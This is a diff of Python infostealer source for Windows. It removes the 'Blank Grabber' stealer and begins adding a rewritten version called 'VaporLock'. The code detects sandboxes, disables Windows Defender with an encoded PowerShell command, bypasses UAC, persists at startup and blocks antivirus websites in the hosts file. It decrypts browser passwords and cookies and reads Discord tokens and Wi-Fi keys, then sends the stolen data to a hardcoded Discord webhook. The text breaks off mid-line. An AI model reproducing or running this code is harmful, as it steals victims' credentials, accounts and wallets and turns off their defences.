@@ -1,1463 +1,1422 @@
-# pip install pyaesm urllib3
+import shutil, requests, platform, socket, getpass, psutil, browser_cookie3, os, re, sys, subprocess, ctypes, json, base64, sqlite3, zipfile, random, cv2, time
 
-import base64
-import os
-import subprocess
-import sys
-import json
-import pyaes
-import random
-import shutil
-import sqlite3
-import re
-import traceback
-import time
-import ctypes
-import logging
-import zlib
-from threading import Thread
-from ctypes import wintypes
-from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warnings_urllib3
-disable_warnings_urllib3()
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from win32crypt import CryptUnprotectData
+from Cryptodome.Cipher import AES
+from contextlib import suppress
+from pathlib import Path
 
-class Settings:
-    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwNzc5OTcxNzYzMzg1NTY0OS9IZ2EwaGh4ekczbG1hLW14dDBhZnJ6c01WaS1JV3JFU0xGX1p0VzJjQ2xYa1lJMC1nZXo3VVRULTFQRUV5QWxqUEtpWg==').decode())
-    Mutex = base64.b64decode('djlOSmtyQzBFSXc4QVBpVw==').decode()
-    PingMe = bool('true')
-    Vmprotect = bool('true')
-    Startup = bool('')
-    Melt = bool('true')
-    UacBypass = bool('')
-    ArchivePassword = base64.b64decode('Y3I=').decode()
-    HideConsole = bool('true')
-    Debug = bool('')
-    RunBoundOnStartup = bool('')
-    CaptureWebcam = bool('true')
-    CapturePasswords = bool('true')
-    CaptureCookies = bool('true')
-    CaptureAutofills = bool('true')
-    CaptureHistory = bool('true')
-    CaptureDiscordTokens = bool('true')
-    CaptureGames = bool('true')
-    CaptureWifiPasswords = bool('true')
-    CaptureSystemInfo = bool('true')
-    CaptureScreenshot = bool('true')
-    CaptureTelegram = bool('true')
-    CaptureCommonFiles = bool('true')
-    CaptureWallets = bool('true')
-    FakeError = (bool(''), ('', '', '0'))
-    BlockAvSites = bool('true')
-    DiscordInjection = bool('true')
-if not hasattr(sys, '_MEIPASS'):
-    sys._MEIPASS = os.path.dirname(os.path.abspath(__file__))
-ctypes.windll.kernel32.SetConsoleMode(ctypes.windll.kernel32.GetStdHandle(-11), 7)
-logging.basicConfig(format='\x1b[1;36m%(funcName)s\x1b[0m:\x1b[1;33m%(levelname)7s\x1b[0m:%(message)s')
-for _, logger in logging.root.manager.loggerDict.items():
-    logger.disabled = True
-Logger = logging.getLogger('Blank Grabber')
-Logger.setLevel(logging.INFO)
-if not Settings.Debug:
-    Logger.disabled = True
 
-class VmProtect:
-    BLACKLISTED_UUIDS = ('7AB5C494-39F5-4941-9163-47F54D6D5016', '032E02B4-0499-05C3-0806-3C0700080009', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FE822042-A70C-D08B-F1D1-C207055A488F', '76122042-C286-FA81-F0A8-514CC507B250', '481E2042-A1AF-D390-CE06-A8F783B1E76A', 'F3988356-32F5-4AE1-8D47-FD3B8BAFBD4C', '9961A120-E691-4FFE-B67B-F0E4115D5919')
-    BLACKLISTED_COMPUTERNAMES = ('bee7370c-8c0c-4', 'desktop-nakffmt', 'win-5e07cos9alr', 'b30f0242-1c6a-4', 'desktop-vrsqlag', 'q9iatrkprh', 'xc64zb', 'desktop-d019gdm', 'desktop-wi8clet', 'server1', 'lisa-pc', 'john-pc', 'desktop-b0t93d6', 'desktop-1pykp29', 'desktop-1y2433r', 'wileypc', 'work', '6c4e733f-c2d9-4', 'ralphs-pc', 'desktop-wg3myjs', 'desktop-7xc6gez', 'desktop-5ov9s0o', 'qarzhrdbpj', 'oreleepc', 'archibaldpc', 'julia-pc', 'd1bnjkfvlh', 'compname_5076', 'desktop-vkeons4', 'NTT-EFF-2W11WSS')
-    BLACKLISTED_USERS = ('wdagutilityaccount', 'abby', 'peter wilson', 'hmarc', 'patex', 'john-pc', 'rdhj0cnfevzx', 'keecfmwgj', 'frank', '8nl0colnq5bq', 'lisa', 'john', 'george', 'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a', 'lmvwjj9b', 'pqonjhvwexss', '3u2v9m8', 'julia', 'heuerzl', 'harry johnson', 'j.seance', 'a.monaldo', 'tvm')
-    BLACKLISTED_TASKS = ('fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice', 'df5serv', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg', 'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver', 'vmwareservice', 'vmwaretray', 'discordtokenprotector')
+class Paths:
+    def __init__(self):
+        self.temp = Path(os.environ["TEMP"])
+        self.windows = os.environ.get("WINDIR")
+        self.userprofile = Path(os.environ["USERPROFILE"])
+        self.appdata_local = Path(os.environ["LOCALAPPDATA"])
+        self.appdata_roaming = Path(os.environ["APPDATA"])
+        
+        program_files = os.environ.get("ProgramFiles")
+        program_files_x86 = os.environ.get("ProgramFiles(x86)")
+        self.program_files = Path(program_files or program_files_x86)
+        self.program_files_x86 = Path(program_files_x86)
 
-    @staticmethod
-    def checkUUID() -> bool:
-        Logger.info('Checking UUID')
-        uuid = subprocess.run('wmic csproduct get uuid', shell=True, capture_output=True).stdout.splitlines()[2].decode(errors='ignore').strip()
-        return uuid in VmProtect.BLACKLISTED_UUIDS
 
-    @staticmethod
-    def checkComputerName() -> bool:
-        Logger.info('Checking computer name')
-        computername = os.getenv('computername')
-        return computername.lower() in VmProtect.BLACKLISTED_COMPUTERNAMES
-
-    @staticmethod
-    def checkUsers() -> bool:
-        Logger.info('Checking username')
-        user = os.getlogin()
-        return user.lower() in VmProtect.BLACKLISTED_USERS
-
-    @staticmethod
-    def checkHosting() -> bool:
-        Logger.info('Checking if system is hosted online')
-        http = PoolManager(cert_reqs='CERT_NONE')
+class Malware:
+    def __init__(self):
+        self.zip_name = f"VL_{random.randint(10000000000, 99999999999)}.zip"
+        self.webhook_url = "https://discord.com/api/webhooks/1507799717633855649/Hga0hhxzG3lma-mxt0afrzsMVi-IWrESLF_ZtW2cClXkYI0-gez7UTT-1PEEyAljPKiZ"
+        self.stealer_version = "0.0.0"
+        self.malware_name = "VaporLock"
+        self.malware_author = "https://guns.lol/croxlv"
+        self.browser_infos = ["Uzantılar", "Şifreler", "Kurabiyeler", "Geçmişler", "İndirmeler", "Kartlar"]
+        self.session_files = ["Cüzdanlar", "Oyun Başlatıcıları", "Uygulamalar"]
+        self.task_manager_blocked = False
+    
+    def delete_file(self, file_path):
         try:
-            return http.request('GET', 'http://ip-api.com/line/?fields=hosting').data.decode(errors='ignore').strip() == 'true'
-        except Exception:
-            Logger.info('Unable to check if system is hosted online')
-            return False
-
-    @staticmethod
-    def checkHTTPSimulation() -> bool:
-        Logger.info('Checking if system is simulating connection')
-        http = PoolManager(cert_reqs='CERT_NONE', timeout=1.0)
-        try:
-            http.request('GET', f'https://blank-{Utility.GetRandomString()}.in')
-        except Exception:
-            return False
-        else:
-            return True
-
-    @staticmethod
-    def checkRegistry() -> bool:
-        Logger.info('Checking registry')
-        r1 = subprocess.run('REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2', capture_output=True, shell=True)
-        r2 = subprocess.run('REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2', capture_output=True, shell=True)
-        gpucheck = any((x.lower() in subprocess.run('wmic path win32_VideoController get name', capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip().lower() for x in ('virtualbox', 'vmware')))
-        dircheck = any([os.path.isdir(path) for path in ('D:\\Tools', 'D:\\OS2', 'D:\\NT3X')])
-        return r1.returncode != 1 and r2.returncode != 1 or gpucheck or dircheck
-
-    @staticmethod
-    def killTasks() -> None:
-        Utility.TaskKill(*VmProtect.BLACKLISTED_TASKS)
-
-    @staticmethod
-    def isVM() -> bool:
-        Logger.info('Checking if system is a VM')
-        Thread(target=VmProtect.killTasks, daemon=True).start()
-        result = VmProtect.checkHTTPSimulation() or VmProtect.checkUUID() or VmProtect.checkComputerName() or VmProtect.checkUsers() or VmProtect.checkHosting() or VmProtect.checkRegistry()
-        if result:
-            Logger.info('System is a VM')
-        else:
-            Logger.info('System is not a VM')
-        return result
-
-class Errors:
-    errors: list[str] = []
-
-    @staticmethod
-    def Catch(func):
-
-        def newFunc(*args, **kwargs):
-            try:
-                return func(*args, **kwargs)
-            except Exception as e:
-                if isinstance(e, KeyboardInterrupt):
-                    os._exit(1)
-                if not isinstance(e, UnicodeEncodeError):
-                    trb = traceback.format_exc()
-                    Errors.errors.append(trb)
-                    if Utility.GetSelf()[1]:
-                        Logger.error(trb)
-        return newFunc
-
-class Tasks:
-    threads: list[Thread] = list()
-
-    @staticmethod
-    def AddTask(task: Thread) -> None:
-        Tasks.threads.append(task)
-
-    @staticmethod
-    def WaitForAll() -> None:
-        for thread in Tasks.threads:
-            thread.join()
-
-class Syscalls:
-
-    @staticmethod
-    def CaptureWebcam(index: int, filePath: str) -> bool:
-        avicap32 = ctypes.windll.avicap32
-        WS_CHILD = 1073741824
-        WM_CAP_DRIVER_CONNECT = 1024 + 10
-        WM_CAP_DRIVER_DISCONNECT = 1026
-        WM_CAP_FILE_SAVEDIB = 1024 + 100 + 25
-        hcam = avicap32.capCreateCaptureWindowW(wintypes.LPWSTR('Blank'), WS_CHILD, 0, 0, 0, 0, ctypes.windll.user32.GetDesktopWindow(), 0)
-        result = False
-        if hcam:
-            if ctypes.windll.user32.SendMessageA(hcam, WM_CAP_DRIVER_CONNECT, index, 0):
-                if ctypes.windll.user32.SendMessageA(hcam, WM_CAP_FILE_SAVEDIB, 0, wintypes.LPWSTR(filePath)):
-                    result = True
-                ctypes.windll.user32.SendMessageA(hcam, WM_CAP_DRIVER_DISCONNECT, 0, 0)
-            ctypes.windll.user32.DestroyWindow(hcam)
-        return result
-
-    @staticmethod
-    def CreateMutex(mutex: str) -> bool:
-        kernel32 = ctypes.windll.kernel32
-        mutex = kernel32.CreateMutexA(None, False, mutex)
-        return kernel32.GetLastError() != 183
-
-    @staticmethod
-    def CryptUnprotectData(encrypted_data: bytes, optional_entropy: str=None) -> bytes:
-
-        class DATA_BLOB(ctypes.Structure):
-            _fields_ = [('cbData', ctypes.c_ulong), ('pbData', ctypes.POINTER(ctypes.c_ubyte))]
-        pDataIn = DATA_BLOB(len(encrypted_data), ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_ubyte)))
-        pDataOut = DATA_BLOB()
-        pOptionalEntropy = None
-        if optional_entropy is not None:
-            optional_entropy = optional_entropy.encode('utf-16')
-            pOptionalEntropy = DATA_BLOB(len(optional_entropy), ctypes.cast(optional_entropy, ctypes.POINTER(ctypes.c_ubyte)))
-        if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, ctypes.byref(pOptionalEntropy) if pOptionalEntropy is not None else None, None, None, 0, ctypes.byref(pDataOut)):
-            data = (ctypes.c_ubyte * pDataOut.cbData)()
-            ctypes.memmove(data, pDataOut.pbData, pDataOut.cbData)
-            ctypes.windll.Kernel32.LocalFree(pDataOut.pbData)
-            return bytes(data)
-        raise ValueError('Invalid encrypted_data provided!')
-
-    @staticmethod
-    def HideConsole() -> None:
-        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-
-class Utility:
-
-    @staticmethod
-    def GetSelf() -> tuple[str, bool]:
-        if hasattr(sys, 'frozen'):
-            return (sys.executable, True)
-        else:
-            return (__file__, False)
-
-    @staticmethod
-    def TaskKill(*tasks: str) -> None:
-        tasks = list(map(lambda x: x.lower(), tasks))
-        out = subprocess.run('tasklist /FO LIST', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().split('\r\n\r\n')
-        for i in out:
-            i = i.split('\r\n')[:2]
-            try:
-                name, pid = (i[0].split()[-1], int(i[1].split()[-1]))
-                name = name[:-4] if name.endswith('.exe') else name
-                if name.lower() in tasks:
-                    subprocess.run('taskkill /F /PID %d' % pid, shell=True, capture_output=True)
-            except Exception:
-                pass
-
-    @staticmethod
-    def UACPrompt(path: str) -> bool:
-        return ctypes.windll.shell32.ShellExecuteW(None, 'runas', path, ' '.join(sys.argv), None, 1) == 42
-
-    @staticmethod
-    def DisableDefender() -> None:
-        command = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDIgJiAiJVByb2dyYW1GaWxlcyVcV2luZG93cyBEZWZlbmRlclxNcENtZFJ1bi5leGUiIC1SZW1vdmVEZWZpbml0aW9ucyAtQWxs').decode(errors='ignore')
-        subprocess.Popen(command, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
-
-    @staticmethod
-    def ExcludeFromDefender(path: str=None) -> None:
-        if path is None:
-            path = Utility.GetSelf()[0]
-        subprocess.Popen("powershell -Command Add-MpPreference -ExclusionPath '{}'".format(path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
-
-    @staticmethod
-    def GetRandomString(length: int=5, invisible: bool=False):
-        if invisible:
-            return ''.join(random.choices(['\xa0', chr(8239)] + [chr(x) for x in range(8192, 8208)], k=length))
-        else:
-            return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=length))
-
-    @staticmethod
-    def GetWifiPasswords() -> dict:
-        profiles = list()
-        passwords = dict()
-        for line in subprocess.run('netsh wlan show profile', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().splitlines():
-            if 'All User Profile' in line:
-                name = line[line.find(':') + 1:].strip()
-                profiles.append(name)
-        for profile in profiles:
-            found = False
-            for line in subprocess.run(f'netsh wlan show profile "{profile}" key=clear', shell=True, capture_output=True).stdout.decode(errors='ignore').strip().splitlines():
-                if 'Key Content' in line:
-                    passwords[profile] = line[line.find(':') + 1:].strip()
-                    found = True
-                    break
-            if not found:
-                passwords[profile] = '(None)'
-        return passwords
-
-    @staticmethod
-    def GetLnkTarget(path_to_lnk: str) -> str | None:
-        target = None
-        if os.path.isfile(path_to_lnk):
-            output = subprocess.run('wmic path win32_shortcutfile where name="%s" get target /value' % os.path.abspath(path_to_lnk).replace('\\', '\\\\'), shell=True, capture_output=True).stdout.decode()
-            if output:
-                for line in output.splitlines():
-                    if line.startswith('Target='):
-                        temp = line.lstrip('Target=').strip()
-                        if os.path.exists(temp):
-                            target = temp
-                            break
-        return target
-
-    @staticmethod
-    def GetLnkFromStartMenu(app: str) -> list[str]:
-        shortcutPaths = []
-        startMenuPaths = [os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs'), os.path.join('C:\\', 'ProgramData', 'Microsoft', 'Windows', 'Start Menu', 'Programs')]
-        for startMenuPath in startMenuPaths:
-            for root, _, files in os.walk(startMenuPath):
-                for file in files:
-                    if file.lower() == '%s.lnk' % app.lower():
-                        shortcutPaths.append(os.path.join(root, file))
-        return shortcutPaths
-
-    @staticmethod
-    def IsAdmin() -> bool:
-        return ctypes.windll.shell32.IsUserAnAdmin() == 1
-
-    @staticmethod
-    def UACbypass(method: int=1) -> bool:
-        if Utility.GetSelf()[1]:
-            execute = lambda cmd: subprocess.run(cmd, shell=True, capture_output=True)
-            match method:
-                case 1:
-                    execute(f'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{sys.executable}" /f')
-                    execute('reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v "DelegateExecute" /f')
-                    log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
-                    execute('computerdefaults --nouacbypass')
-                    log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
-                    execute('reg delete hkcu\\Software\\Classes\\ms-settings /f')
-                    if log_count_after > log_count_before:
-                        return Utility.UACbypass(method + 1)
-                case 2:
-                    execute(f'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{sys.executable}" /f')
-                    execute('reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v "DelegateExecute" /f')
-                    log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
-                    execute('fodhelper --nouacbypass')
-                    log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
-                    execute('reg delete hkcu\\Software\\Classes\\ms-settings /f')
-                    if log_count_after > log_count_before:
-                        return Utility.UACbypass(method + 1)
-                case _:
-                    return False
-            return True
-
-    @staticmethod
-    def IsInStartup() -> bool:
-        path = os.path.dirname(Utility.GetSelf()[0])
-        return os.path.basename(path).lower() == 'startup'
-
-    @staticmethod
-    def PutInStartup() -> str:
-        STARTUPDIR = 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp'
-        file, isExecutable = Utility.GetSelf()
-        if isExecutable:
-            out = os.path.join(STARTUPDIR, '{}.scr'.format(Utility.GetRandomString(invisible=True)))
-            os.makedirs(STARTUPDIR, exist_ok=True)
-            try:
-                shutil.copy(file, out)
-            except Exception:
-                return None
-            return out
-
-    @staticmethod
-    def IsConnectedToInternet() -> bool:
-        http = PoolManager(cert_reqs='CERT_NONE')
-        try:
-            return http.request('GET', 'https://gstatic.com/generate_204').status == 204
-        except Exception:
-            return False
-
-    @staticmethod
-    def DeleteSelf():
-        path, isExecutable = Utility.GetSelf()
-        if isExecutable:
-            subprocess.Popen('ping localhost -n 3 > NUL && del /A H /F "{}"'.format(path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
-            os._exit(0)
-        else:
-            os.remove(path)
-
-    @staticmethod
-    def HideSelf() -> None:
-        path, _ = Utility.GetSelf()
-        subprocess.Popen('attrib +h +s "{}"'.format(path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
-
-    @staticmethod
-    def BlockSites() -> None:
-        if Utility.IsAdmin():
-            call = subprocess.run('REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /V DataBasePath', shell=True, capture_output=True)
-            if call.returncode != 0:
-                hostdirpath = os.path.join('System32', 'drivers', 'etc')
-            else:
-                hostdirpath = os.sep.join(call.stdout.decode(errors='ignore').strip().splitlines()[-1].split()[-1].split(os.sep)[1:])
-            hostfilepath = os.path.join(os.getenv('systemroot'), hostdirpath, 'hosts')
-            if not os.path.isfile(hostfilepath):
-                return
-            with open(hostfilepath) as file:
-                data = file.readlines()
-            BANNED_SITES = ('virustotal.com', 'avast.com', 'totalav.com', 'scanguard.com', 'totaladblock.com', 'pcprotect.com', 'mcafee.com', 'bitdefender.com', 'us.norton.com', 'avg.com', 'malwarebytes.com', 'pandasecurity.com', 'avira.com', 'norton.com', 'eset.com', 'zillya.com', 'kaspersky.com', 'usa.kaspersky.com', 'sophos.com', 'home.sophos.com', 'adaware.com', 'bullguard.com', 'clamav.net', 'drweb.com', 'emsisoft.com', 'f-secure.com', 'zonealarm.com', 'trendmicro.com', 'ccleaner.com')
-            newdata = []
-            for i in data:
-                if any([x in i for x in BANNED_SITES]):
-                    continue
-                else:
-                    newdata.append(i)
-            for i in BANNED_SITES:
-                newdata.append('\t0.0.0.0 {}'.format(i))
-                newdata.append('\t0.0.0.0 www.{}'.format(i))
-            newdata = '\n'.join(newdata).replace('\n\n', '\n')
-            subprocess.run('attrib -r {}'.format(hostfilepath), shell=True, capture_output=True)
-            with open(hostfilepath, 'w') as file:
-                file.write(newdata)
-            subprocess.run('attrib +r {}'.format(hostfilepath), shell=True, capture_output=True)
-
-class Browsers:
-
-    class Chromium:
-        BrowserPath: str = None
-        EncryptionKey: bytes = None
-
-        def __init__(self, browserPath: str) -> None:
-            if not os.path.isdir(browserPath):
-                raise NotADirectoryError('Browser path not found!')
-            self.BrowserPath = browserPath
-
-        def GetEncryptionKey(self) -> bytes | None:
-            if self.EncryptionKey is not None:
-                return self.EncryptionKey
-            else:
-                localStatePath = os.path.join(self.BrowserPath, 'Local State')
-                if os.path.isfile(localStatePath):
-                    with open(localStatePath, encoding='utf-8', errors='ignore') as file:
-                        jsonContent: dict = json.load(file)
-                    encryptedKey: str = jsonContent['os_crypt']['encrypted_key']
-                    encryptedKey = base64.b64decode(encryptedKey.encode())[5:]
-                    self.EncryptionKey = Syscalls.CryptUnprotectData(encryptedKey)
-                    return self.EncryptionKey
-                else:
-                    return None
-
-        def Decrypt(self, buffer: bytes, key: bytes) -> str:
-            version = buffer.decode(errors='ignore')
-            if version.startswith(('v10', 'v11')):
-                iv = buffer[3:15]
-                cipherText = buffer[15:]
-                return pyaes.AESModeOfOperationGCM(key, iv).decrypt(cipherText)[:-16].decode(errors='ignore')
-            else:
-                return str(Syscalls.CryptUnprotectData(buffer))
-
-        def GetPasswords(self) -> list[tuple[str, str, str]]:
-            encryptionKey = self.GetEncryptionKey()
-            passwords = list()
-            if encryptionKey is None:
-                return passwords
-            loginFilePaths = list()
-            for root, _, files in os.walk(self.BrowserPath):
-                for file in files:
-                    if file.lower() == 'login data':
-                        filepath = os.path.join(root, file)
-                        loginFilePaths.append(filepath)
-            for path in loginFilePaths:
-                while True:
-                    tempfile = os.path.join(os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
-                    if not os.path.isfile(tempfile):
-                        break
-                try:
-                    shutil.copy(path, tempfile)
-                except Exception:
-                    continue
-                db = sqlite3.connect(tempfile)
-                db.text_factory = lambda b: b.decode(errors='ignore')
-                cursor = db.cursor()
-                try:
-                    results = cursor.execute('SELECT origin_url, username_value, password_value FROM logins').fetchall()
-                    for url, username, password in results:
-                        password = self.Decrypt(password, encryptionKey)
-                        if url and username and password:
-                            passwords.append((url, username, password))
-                except Exception:
-                    pass
-                cursor.close()
-                db.close()
-                os.remove(tempfile)
-            return passwords
-
-        def GetCookies(self) -> list[tuple[str, str, str, str, int]]:
-            encryptionKey = self.GetEncryptionKey()
-            cookies = list()
-            if encryptionKey is None:
-                return cookies
-            cookiesFilePaths = list()
-            for root, _, files in os.walk(self.BrowserPath):
-                for file in files:
-                    if file.lower() == 'cookies':
-                        filepath = os.path.join(root, file)
-                        cookiesFilePaths.append(filepath)
-            for path in cookiesFilePaths:
-                while True:
-                    tempfile = os.path.join(os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
-                    if not os.path.isfile(tempfile):
-                        break
-                try:
-                    shutil.copy(path, tempfile)
-                except Exception:
-                    continue
-                db = sqlite3.connect(tempfile)
-                db.text_factory = lambda b: b.decode(errors='ignore')
-                cursor = db.cursor()
-                try:
-                    results = cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies').fetchall()
-                    for host, name, path, cookie, expiry in results:
-                        cookie = self.Decrypt(cookie, encryptionKey)
-                        if host and name and cookie:
-                            cookies.append((host, name, path, cookie, expiry))
-                except Exception:
-                    pass
-                cursor.close()
-                db.close()
-                os.remove(tempfile)
-            return cookies
-
-        def GetHistory(self) -> list[tuple[str, str, int]]:
-            history = list()
-            historyFilePaths = list()
-            for root, _, files in os.walk(self.BrowserPath):
-                for file in files:
-                    if file.lower() == 'history':
-                        filepath = os.path.join(root, file)
-                        historyFilePaths.append(filepath)
-            for path in historyFilePaths:
-                while True:
-                    tempfile = os.path.join(os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
-                    if not os.path.isfile(tempfile):
-                        break
-                try:
-                    shutil.copy(path, tempfile)
-                except Exception:
-                    continue
-                db = sqlite3.connect(tempfile)
-                db.text_factory = lambda b: b.decode(errors='ignore')
-                cursor = db.cursor()
-                try:
-                    results = cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls').fetchall()
-                    for url, title, vc, lvt in results:
-                        if url and title and (vc is not None) and (lvt is not None):
-                            history.append((url, title, vc, lvt))
-                except Exception:
-                    pass
-                cursor.close()
-                db.close()
-                os.remove(tempfile)
-            history.sort(key=lambda x: x[3], reverse=True)
-            return list([(x[0], x[1], x[2]) for x in history])
-
-        def GetAutofills(self) -> list[str]:
-            autofills = list()
-            autofillsFilePaths = list()
-            for root, _, files in os.walk(self.BrowserPath):
-                for file in files:
-                    if file.lower() == 'web data':
-                        filepath = os.path.join(root, file)
-                        autofillsFilePaths.append(filepath)
-            for path in autofillsFilePaths:
-                while True:
-                    tempfile = os.path.join(os.getenv('temp'), Utility.GetRandomString(10) + '.tmp')
-                    if not os.path.isfile(tempfile):
-                        break
-                try:
-                    shutil.copy(path, tempfile)
-                except Exception:
-                    continue
-                db = sqlite3.connect(tempfile)
-                db.text_factory = lambda b: b.decode(errors='ignore')
-                cursor = db.cursor()
-                try:
-                    results: list[str] = [x[0] for x in cursor.execute('SELECT value FROM autofill').fetchall()]
-                    for data in results:
-                        data = data.strip()
-                        if data and (not data in autofills):
-                            autofills.append(data)
-                except Exception:
-                    pass
-                cursor.close()
-                db.close()
-                os.remove(tempfile)
-            return autofills
-
-class Discord:
-    httpClient = PoolManager(cert_reqs='CERT_NONE')
-    ROAMING = os.getenv('appdata')
-    LOCALAPPDATA = os.getenv('localappdata')
-    REGEX = '[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{25,110}'
-    REGEX_ENC = 'dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\"]*'
-
-    @staticmethod
-    def GetHeaders(token: str=None) -> dict:
-        headers = {'content-type': 'application/json', 'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4593.122 Safari/537.36'}
-        if token:
-            headers['authorization'] = token
-        return headers
-
-    @staticmethod
-    def GetTokens() -> list[dict]:
-        results: list[dict] = list()
-        tokens: list[str] = list()
-        threads: list[Thread] = list()
-        paths = {'Discord': os.path.join(Discord.ROAMING, 'discord'), 'Discord Canary': os.path.join(Discord.ROAMING, 'discordcanary'), 'Lightcord': os.path.join(Discord.ROAMING, 'Lightcord'), 'Discord PTB': os.path.join(Discord.ROAMING, 'discordptb'), 'Opera': os.path.join(Discord.ROAMING, 'Opera Software', 'Opera Stable'), 'Opera GX': os.path.join(Discord.ROAMING, 'Opera Software', 'Opera GX Stable'), 'Amigo': os.path.join(Discord.LOCALAPPDATA, 'Amigo', 'User Data'), 'Torch': os.path.join(Discord.LOCALAPPDATA, 'Torch', 'User Data'), 'Kometa': os.path.join(Discord.LOCALAPPDATA, 'Kometa', 'User Data'), 'Orbitum': os.path.join(Discord.LOCALAPPDATA, 'Orbitum', 'User Data'), 'CentBrowse': os.path.join(Discord.LOCALAPPDATA, 'CentBrowser', 'User Data'), '7Sta': os.path.join(Discord.LOCALAPPDATA, '7Star', '7Star', 'User Data'), 'Sputnik': os.path.join(Discord.LOCALAPPDATA, 'Sputnik', 'Sputnik', 'User Data'), 'Vivaldi': os.path.join(Discord.LOCALAPPDATA, 'Vivaldi', 'User Data'), 'Chrome SxS': os.path.join(Discord.LOCALAPPDATA, 'Google', 'Chrome SxS', 'User Data'), 'Chrome': os.path.join(Discord.LOCALAPPDATA, 'Google', 'Chrome', 'User Data'), 'FireFox': os.path.join(Discord.ROAMING, 'Mozilla', 'Firefox', 'Profiles'), 'Epic Privacy Browse': os.path.join(Discord.LOCALAPPDATA, 